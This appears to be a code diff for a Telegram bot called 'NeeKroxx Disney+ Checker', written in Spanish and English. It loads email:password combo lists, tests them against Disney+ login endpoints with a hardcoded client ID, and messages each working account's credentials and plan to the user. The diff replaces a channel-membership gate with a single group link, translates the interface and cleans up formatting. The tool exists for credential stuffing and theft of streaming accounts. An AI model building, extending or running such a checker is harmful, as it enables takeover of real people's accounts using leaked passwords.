@@ -21,22 +21,16 @@ load_dotenv()
 # CONFIGURACIÓN
 # ==========================================
 BOT_TOKEN = os.getenv("BOT_TOKEN", "TU_TOKEN_AQUI")
-OWNER_USERNAME = "@neekroxx"
+OWNER_USERNAME = "@NeeKroxx"
 WEBSITE_URL = "neekroxx.store"
-
-REQUIRED_CHANNELS = [
-    "@neekroxx_mains",
-    "@neekroxx_tools",
-    "@neekroxx_vouches",
-    "@neekroxx_combos"
-]
+GROUP_LINK = "https://t.me/+zPlCfWUe8ZczZjc5"
 
 # Disney+ BAMTech API
 DISNEY_CLIENT_ID = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
 DISNEY_TOKEN_URL = "https://global.edge.bamtech.com/token"
 DISNEY_ACCOUNT_URL = "https://global.edge.bamtech.com/accounts/me"
 
-# Imágenes (Reemplaza con tus URLs reales)
+# Imágenes (Reemplaza con tus URLs reales de Imgur o similar)
 WELCOME_IMAGE = "https://i.imgur.com/placeholder_welcome.jpg"
 CHECKING_IMAGE = "https://i.imgur.com/placeholder_checking.jpg"
 
@@ -50,7 +44,7 @@ dp = Dispatcher(storage=storage)
 router = Router()
 dp.include_router(router)
 
-# Almacenamiento en memoria
+# Almacenamiento en memoria por usuario
 user_data = {}
 
 # ==========================================
@@ -126,7 +120,7 @@ async def run_checker_batch(bot_ref, user_id: int, combos: list, threads: int = 
                     hits.append(result)
                     await bot_ref.send_message(
                         user_id,
-                        f"✅ <b>HIT DETECTADO</b>\n <code>{result['email']}</code>\n🔑 <code>{result['password']}</code>\n⭐ Activa: {result['active']}\n📦 Plan: {result['subscription']}"
+                        f"✅ <b>HIT DETECTADO</b>\n📧 <code>{result['email']}</code>\n🔑 <code>{result['password']}</code>\n⭐ Activa: {result['active']}\n📦 Plan: {result['subscription']}"
                     )
                 elif result["status"] == "BAD":
                     bad += 1
@@ -149,25 +143,16 @@ async def run_checker_batch(bot_ref, user_id: int, combos: list, threads: int = 
 # ==========================================
 # HANDLERS
 # ==========================================
-async def check_membership(user_id: int) -> bool:
-    for channel in REQUIRED_CHANNELS:
-        try:
-            member = await bot.get_chat_member(channel, user_id)
-            if member.status in ["left", "kicked"]:
-                return False
-        except Exception:
-            return False
-    return True
-
 async def show_main_menu(message, user_id: int, state: FSMContext):
     await state.set_state(CheckerStates.main_menu)
-    user_data[user_id] = {"threads": 10, "retries": 2, "combos": [], "hits": [], "bad": 0}
+    if user_id not in user_data:
+        user_data[user_id] = {"threads": 10, "retries": 2, "combos": [], "hits": [], "bad": 0}
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🚀 Start Checking", callback_data="start_checking")],
         [InlineKeyboardButton(text="⚙️ Settings", callback_data="settings"),
          InlineKeyboardButton(text="📋 Past Results", callback_data="past_results")],
-        [InlineKeyboardButton(text=" Live Status", callback_data="live_status"),
+        [InlineKeyboardButton(text="📊 Live Status", callback_data="live_status"),
          InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
         [InlineKeyboardButton(text="📘 Help & Guide", callback_data="help_guide")],
         [InlineKeyboardButton(text="🌐 Visit Website", url=f"https://{WEBSITE_URL}"),
@@ -175,15 +160,15 @@ async def show_main_menu(message, user_id: int, state: FSMContext):
     ])
     
     caption = (
-        f" <b>NeeKroxx Disney+ Checker</b>\n"
+        f"🔥 <b>NeeKroxx Disney+ Checker</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"👋 Welcome back! Choose an action below.\n\n"
-        f"🚀 <b>Start Checking</b> — launch wizard\n"
-        f"️ <b>Settings</b> — defaults & proxies\n"
-        f"📋 <b>Past Results</b> — previous hits\n"
-        f"📊 <b>Live Status</b> — real-time progress\n"
-        f"👤 <b>Profile</b> — your hit stats\n"
-        f" <b>Help</b> — usage guide\n\n"
+        f"👋 ¡Bienvenido! Elige una opción:\n\n"
+        f"🚀 <b>Start Checking</b> — Verificar cuentas\n"
+        f"⚙️ <b>Settings</b> — Configuración\n"
+        f"📋 <b>Past Results</b> — Resultados\n"
+        f"📊 <b>Live Status</b> — Estado en vivo\n"
+        f"👤 <b>Profile</b> — Tu perfil\n"
+        f"📘 <b>Help</b> — Ayuda\n\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🌐 Website: <code>{WEBSITE_URL}</code>\n"
         f"👤 Owner: <code>{OWNER_USERNAME}</code>"
@@ -202,20 +187,18 @@ async def cmd_start(message: Message, state: FSMContext):
     await state.set_state(CheckerStates.waiting_verification)
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🏠 Join NeeKroxx Mains", url="https://t.me/neekroxx_mains")],
-        [InlineKeyboardButton(text="🛠️ Join NeeKroxx Tools", url="https://t.me/neekroxx_tools")],
-        [InlineKeyboardButton(text="⭐ Join NeeKroxx Vouches", url="https://t.me/neekroxx_vouches")],
-        [InlineKeyboardButton(text=" Join NeeKroxx Combos", url="https://t.me/neekroxx_combos")],
-        [InlineKeyboardButton(text="✅ I've Joined — Verify", callback_data="verify_channels")]
+        [InlineKeyboardButton(text="👥 ÚNETE AL GRUPO", url=GROUP_LINK)],
+        [InlineKeyboardButton(text="✅ VERIFICADO", callback_data="verify_channels")]
     ])
     
     await message.answer_photo(
         photo=WELCOME_IMAGE,
         caption=(
-            " <b>NeeKroxx Disney+ Checker</b>\n"
-            "🚫 <b>Channel Verification Required</b>\n"
+            "🔥 <b>NeeKroxx Disney+ Checker</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
-            " Welcome! Join all channels to unlock the bot.\n\n"
+            "👋 ¡Bienvenido! Para usar el bot:\n\n"
+            "1️⃣ Únete a nuestro grupo oficial\n"
+            "2️⃣ Presiona el botón <b>VERIFICADO</b>\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
             f"🌐 Website: <code>{WEBSITE_URL}</code>\n"
             f"👤 Owner: <code>{OWNER_USERNAME}</code>"
@@ -225,12 +208,9 @@ async def cmd_start(message: Message, state: FSMContext):
 
 @router.callback_query(F.data == "verify_channels")
 async def cb_verify(callback: CallbackQuery, state: FSMContext):
-    is_member = await check_membership(callback.from_user.id)
-    if not is_member:
-        await callback.answer("❌ You must join all channels first!", show_alert=True)
-        return
+    # Concedemos acceso directamente al presionar el botón
     await show_main_menu(callback.message, callback.from_user.id, state)
-    await callback.answer()
+    await callback.answer("✅ ¡Bienvenido! Ya tienes acceso al bot.")
 
 @router.callback_query(F.data == "start_checking")
 async def cb_start_checking(callback: CallbackQuery, state: FSMContext):
@@ -245,7 +225,7 @@ async def cb_start_checking(callback: CallbackQuery, state: FSMContext):
         "🔥 <b>NeeKroxx Disney+ Checker</b>\n"
         "●○○○○ <b>Step 1/5</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        " <b>Combo List</b>\n\n"
+        "📂 <b>Combo List</b>\n\n"
         "Choose how to load your combo list:\n\n"
         "📤 <b>Upload File</b> — Send a .txt file\n"
         "📝 <b>Paste Text</b> — Type or paste combos\n\n"
@@ -269,12 +249,14 @@ async def cb_upload(callback: CallbackQuery, state: FSMContext):
 @router.message(CheckerStates.step1_combo, F.document)
 async def handle_file(message: Message, state: FSMContext):
     if not message.document.file_name.endswith(".txt"):
-        await message.answer("❌ Only .txt files accepted."); return
+        await message.answer("❌ Only .txt files accepted.")
+        return
     content = await message.document.download(as_bytes=True)
     combos = parse_combos(content.decode("utf-8", errors="ignore"))
     
     if not combos:
-        await message.answer(" No valid combos found."); return
+        await message.answer("❌ No valid combos found.")
+        return
     
     user_data[message.from_user.id]["combos"] = combos
     await message.answer(f"✅ Loaded <b>{len(combos)}</b> combos. Ready to configure.")
@@ -284,7 +266,8 @@ async def handle_file(message: Message, state: FSMContext):
 async def handle_text(message: Message, state: FSMContext):
     combos = parse_combos(message.text)
     if not combos:
-        await message.answer("❌ No valid combos found. Format: email:password"); return
+        await message.answer("❌ No valid combos found. Format: email:password")
+        return
     
     user_data[message.from_user.id]["combos"] = combos
     await message.answer(f"✅ Loaded <b>{len(combos)}</b> combos. Ready to configure.")
@@ -306,15 +289,18 @@ async def cb_settings(callback: CallbackQuery, state: FSMContext):
         [InlineKeyboardButton(text="🏠 Main Menu", callback_data="main_menu")]
     ])
     await callback.message.edit_caption(
-        caption=f"⚙️ <b>Settings</b>\n\n Threads: <b>{data.get('threads', 10)}</b>",
+        caption=f"⚙️ <b>Settings</b>\n\n⚡ Threads: <b>{data.get('threads', 10)}</b>",
         reply_markup=keyboard
     )
     await callback.answer()
 
 @router.callback_query(F.data == "set_threads")
 async def cb_set_threads(callback: CallbackQuery, state: FSMContext):
-    await callback.message.edit_caption(caption="⚡ <b>Set Threads</b>\n\nSend a number (1-50):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏮️ Back", callback_data="settings")]]))
-    await state.set_state(CheckerStates.step2_settings) # Reutilizamos estado para esperar input
+    await callback.message.edit_caption(
+        caption="⚡ <b>Set Threads</b>\n\nSend a number (1-50):", 
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏮️ Back", callback_data="settings")]])
+    )
+    await state.set_state(CheckerStates.step2_settings)
     await callback.answer()
 
 @router.message(CheckerStates.step2_settings)
@@ -334,11 +320,12 @@ async def handle_threads_input(message: Message, state: FSMContext):
 async def cb_run(callback: CallbackQuery, state: FSMContext):
     data = user_data.get(callback.from_user.id)
     if not data or not data.get("combos"):
-        await callback.answer("❌ No combos loaded.", show_alert=True); return
+        await callback.answer("❌ No combos loaded.", show_alert=True)
+        return
     
     await state.set_state(CheckerStates.step4_running)
     await callback.message.edit_caption(
-        caption=f" <b>NeeKroxx Disney+ Checker</b>\n○○○○● <b>Step 5/5 — Running</b>\n\n⚡ Threads: {data['threads']}\n📊 Total: {len(data['combos'])}\n\nChecking in progress...",
+        caption=f"🔥 <b>NeeKroxx Disney+ Checker</b>\n○○○○● <b>Step 5/5 — Running</b>\n\n⚡ Threads: {data['threads']}\n📊 Total: {len(data['combos'])}\n\nChecking in progress...",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📊 Live Status", callback_data="live_status")]])
     )
     await callback.answer()
